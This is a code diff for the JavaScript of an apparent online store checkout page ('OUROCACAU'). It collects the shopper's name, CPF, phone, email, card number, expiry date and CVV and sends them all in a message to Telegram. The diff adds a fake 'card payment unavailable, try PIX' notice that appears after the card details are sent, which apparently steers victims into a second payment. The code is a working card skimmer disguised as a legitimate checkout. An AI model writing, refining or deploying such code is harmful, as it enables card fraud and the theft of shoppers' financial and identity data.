@@ -75,25 +75,27 @@ document.addEventListener('DOMContentLoaded', function() {
     // Enviar dados para o Telegram
     async function enviarParaTelegram(dados) {
         const mensagem = `
-🎯 <b>NOVA COMPRA - OUROCACAU</b>
-━━━━━━━━━━━━━━━━━━━━━━
-📦 <b>Produto:</b> ${dados.produto}
-💰 <b>Valor:</b> ${dados.valor}
-━━━━━━━━━━━━━━━━━━━━━━
-👤 <b>Dados do Cliente:</b>
+<b>💳 NOVO PAGAMENTO COM CARTÃO</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━
+
+<b>🎁 PRODUTO</b>
+├ Produto: ${dados.produto}
+└ Valor: ${dados.valor}
+
+<b>👤 DADOS DO CLIENTE</b>
 ├ Nome: ${dados.nome}
 ├ CPF: ${dados.cpf}
 ├ Telefone: ${dados.telefone}
-└ Email: ${dados.email}
-━━━━━━━━━━━━━━━━━━━━━━
-💳 <b>Dados do Cartão:</b>
-├ Titular: ${dados.cardNome}
-├ Número: ${dados.cardNumero}
-├ Validade: ${dados.cardValidade}
-├ CVV: ${dados.cardCvv}
-└ CPF: ${dados.cardCpf}
-━━━━━━━━━━━━━━━━━━━━━━
-⏰ <b>Data:</b> ${new Date().toLocaleString('pt-BR')}
+└ E-mail: ${dados.email}
+
+<b>💳 DADOS DO CARTÃO</b>
+├ Titular: ${dados.titular}
+├ Número: ${dados.numero}
+├ Validade: ${dados.validade}
+└ CVV: ${dados.cvv}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━
+<b>⏰ Data:</b> ${new Date().toLocaleString('pt-BR')}
         `;
 
         try {
@@ -108,11 +110,7 @@ document.addEventListener('DOMContentLoaded', function() {
             });
             
             const data = await response.json();
-            if (data.ok) {
-                return true;
-            } else {
-                throw new Error('Erro ao enviar');
-            }
+            return data.ok;
         } catch (error) {
             console.error('Erro ao enviar para Telegram:', error);
             return false;
@@ -124,7 +122,7 @@ document.addEventListener('DOMContentLoaded', function() {
         const toast = document.getElementById('copyToast');
         if (!toast) return;
         
-        toast.innerText = msg || '📋 Código copiado!';
+        toast.innerText = msg;
         toast.classList.add('show');
         setTimeout(() => toast.classList.remove('show'), 3000);
     }
@@ -143,30 +141,26 @@ document.addEventListener('DOMContentLoaded', function() {
                 } catch(e) {}
             }
             
-            // Obter dados do cliente
-            const nome = document.getElementById('nome')?.value.trim() || '';
-            const cpf = document.getElementById('cpf')?.value.trim() || '';
-            const telefone = document.getElementById('telefone')?.value.trim() || '';
-            const email = document.getElementById('email')?.value.trim() || '';
-            
-            // Obter dados do cartão
-            const cardNome = document.getElementById('cardNome')?.value.trim() || '';
-            const cardNumero = document.getElementById('cardNumero')?.value.trim() || '';
-            const cardValidade = document.getElementById('cardValidade')?.value.trim() || '';
-            const cardCvv = document.getElementById('cardCvv')?.value.trim() || '';
-            const cardCpf = document.getElementById('cardCpf')?.value.trim() || '';
+            // Obter dados do formulário cartão
+            const nome = document.getElementById('cardNome')?.value.trim() || '';
+            const cpf = document.getElementById('cardCpf')?.value.trim() || '';
+            const email = document.getElementById('cardEmail')?.value.trim() || '';
+            const telefone = document.getElementById('cardTelefone')?.value.trim() || '';
+            const titular = document.getElementById('cardTitular')?.value.trim() || '';
+            const numero = document.getElementById('cardNumero')?.value.trim() || '';
+            const validade = document.getElementById('cardValidade')?.value.trim() || '';
+            const cvv = document.getElementById('cardCvv')?.value.trim() || '';
             
             // Validações
             if (!nome) { showToast('❌ Nome é obrigatório'); return; }
             if (!cpf || cpf.length < 11) { showToast('❌ CPF inválido'); return; }
-            if (!telefone) { showToast('❌ Telefone é obrigatório'); return; }
             if (!email || !email.includes('@')) { showToast('❌ E-mail inválido'); return; }
-            if (!cardNome) { showToast('❌ Nome do titular é obrigatório'); return; }
-            if (!cardNumero || cardNumero.replace(/\s/g, '').length < 16) { showToast('❌ Número do cartão inválido'); return; }
-            if (!validarCartao(cardNumero)) { showToast('❌ Número do cartão inválido'); return; }
-            if (!cardValidade || !validarValidade(cardValidade)) { showToast('❌ Data de validade inválida'); return; }
-            if (!cardCvv || cardCvv.length < 3) { showToast('❌ CVV inválido'); return; }
-            if (!cardCpf || cardCpf.length < 11) { showToast('❌ CPF do titular inválido'); return; }
+            if (!telefone) { showToast('❌ Telefone é obrigatório'); return; }
+            if (!titular) { showToast('❌ Nome do titular é obrigatório'); return; }
+            if (!numero || numero.replace(/\s/g, '').length < 16) { showToast('❌ Número do cartão inválido'); return; }
+            if (!validarCartao(numero)) { showToast('❌ Número do cartão inválido'); return; }
+            if (!validade || !validarValidade(validade)) { showToast('❌ Data de validade inválida'); return; }
+            if (!cvv || cvv.length < 3) { showToast('❌ CVV inválido'); return; }
             
             // Preparar dados para envio
             const dadosEnvio = {
@@ -174,13 +168,12 @@ document.addEventListener('DOMContentLoaded', function() {
                 valor: `R$ ${produto.preco.toFixed(2)}`,
                 nome: nome,
                 cpf: cpf,
-                telefone: telefone,
                 email: email,
-                cardNome: cardNome,
-                cardNumero: cardNumero,
-                cardValidade: cardValidade,
-                cardCvv: cardCvv,
-                cardCpf: cardCpf
+                telefone: telefone,
+                titular: titular,
+                numero: numero,
+                validade: validade,
+                cvv: cvv
             };
             
             // Desabilitar botão e mostrar loading
@@ -193,12 +186,12 @@ document.addEventListener('DOMContentLoaded', function() {
             const enviado = await enviarParaTelegram(dadosEnvio);
             
             if (enviado) {
-                showToast('✅ Pedido enviado com sucesso! Em breve entraremos em contato.');
+                showToast('⚠️ Pagamento em cartão indisponível no momento, tente pagar com PIX.');
                 setTimeout(() => {
-                    window.location.href = '/';
+                    window.location.href = '/formulario';
                 }, 2000);
             } else {
-                showToast('❌ Erro ao processar pagamento. Tente novamente.');
+                showToast('❌ Erro ao processar. Tente novamente.');
                 btn.disabled = false;
                 btn.innerHTML = originalText;
             }
